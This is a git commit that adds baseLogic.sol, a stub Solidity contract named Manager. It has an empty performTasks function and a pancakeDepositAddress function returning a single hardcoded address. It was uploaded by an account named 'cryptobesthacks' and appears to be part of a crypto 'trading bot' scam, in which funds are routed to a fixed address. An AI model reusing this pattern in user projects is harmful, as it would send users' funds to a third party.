380b8a777d52125517b1a6009fd1b7e06f8591d6
David <88288103+cryptobesthacks@users.noreply.github.com>
2021-08-01 21:30:54 +0200

    Add files via upload

---
+++ baseLogic.sol
@@ -0,0 +1,12 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0x9eaE6b4360B7255C014027AE0DC5dd15E7554cd0;
+	}
+  
+}
